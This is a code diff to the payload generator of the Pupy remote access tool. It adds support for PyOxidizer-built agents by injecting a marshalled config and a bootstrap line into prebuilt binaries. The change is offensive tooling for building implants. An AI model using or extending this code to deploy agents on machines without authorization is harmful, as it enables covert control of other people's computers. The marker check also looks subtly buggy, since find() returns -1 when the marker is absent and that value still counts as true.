@@ -53,6 +53,7 @@ from pupy.scriptlets import (
 )
 from pupy.modules.lib.windows.powershell import obfuscatePowershellScript
 from pupy.pupylib.PupyCredentials import Credentials, EncryptionError
+from pupy.network.lib.convcompat import reprb
 
 logger = getLogger('gen')
 
@@ -103,9 +104,11 @@ def get_edit_binary(target, display, path, conf):
 
     i = 0
     offsets = []
-
+    is_pyoxidizer = False
+    if binary.find(b'OxidizedResource', 0):
+        is_pyoxidizer = True
     while True:
-        i = binary.find(b'####---PUPY_CONFIG_COMES_HERE---####\n', i+1)
+        i = binary.find(b'####---PUPY_CONFIG_COMES_HERE---####', i+1)
         if i == -1:
             break
 
@@ -127,22 +130,27 @@ def get_edit_binary(target, display, path, conf):
             'pupy.network', 'pupy.agent'
         ), ignore_native=True, as_dict=True
     )
+    
+    if is_pyoxidizer:
+        pyoxidizer_bootstrap = f"import marshal,pupy.agent; pupy.agent.main(config=marshal.loads({marshal.dumps(config)}))#"
+        new_conf = pyoxidizer_bootstrap.encode('ascii')
+        new_conf_len = len(pyoxidizer_bootstrap)
+    else:
+        new_conf = marshal.dumps([config, pupylib], 2)
 
-    new_conf = marshal.dumps([config, pupylib], 2)
+        logger.debug(
+            'First marshalled bytes: %s (total=%d)',
+            ' '.join(
+                '{:02x}'.format(bord(c)) for c in new_conf[:64]
+            ), len(new_conf)
+        )
+        
+        uncompressed = len(new_conf)
+        new_conf = pylzma.compress(new_conf)
 
-    logger.debug(
-        'First marshalled bytes: %s (total=%d)',
-        ' '.join(
-            '{:02x}'.format(bord(c)) for c in new_conf[:64]
-        ), len(new_conf)
-    )
-
-    uncompressed = len(new_conf)
-    new_conf = pylzma.compress(new_conf)
-
-    compressed = len(new_conf)
-    new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
-    new_conf_len = len(new_conf)
+        compressed = len(new_conf)
+        new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
+        new_conf_len = len(new_conf)
 
     if new_conf_len > HARDCODED_CONF_SIZE:
         raise Exception(
@@ -150,8 +158,10 @@ def get_edit_binary(target, display, path, conf):
             'You need to recompile the dll with '
             'a bigger buffer'.format(new_conf_len, HARDCODED_CONF_SIZE)
         )
-
-    new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
+    if not is_pyoxidizer:
+        new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
+    #else:
+    #    new_conf = new_conf + (b"#"*(HARDCODED_CONF_SIZE-new_conf_len))
 
     logger.debug('Free space: %d', HARDCODED_CONF_SIZE-new_conf_len)
 
@@ -161,7 +171,7 @@ def get_edit_binary(target, display, path, conf):
             ' ' .join(['{:02x}'.format(bord(c)) for c in new_conf[0:20]])
             )
 
-    binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
+    binary = binary[0:offset]+new_conf+binary[offset+len(new_conf):]
 
     
     if binary[:2] == b'MZ':
@@ -268,6 +278,8 @@ def get_raw_conf(display, conf, verbose=False):
             (10, 5, 10), (50, 30, 50), (-1, 150, 300)
         ])
     }
+    if verbose:
+        print(config)
 
     return config
 
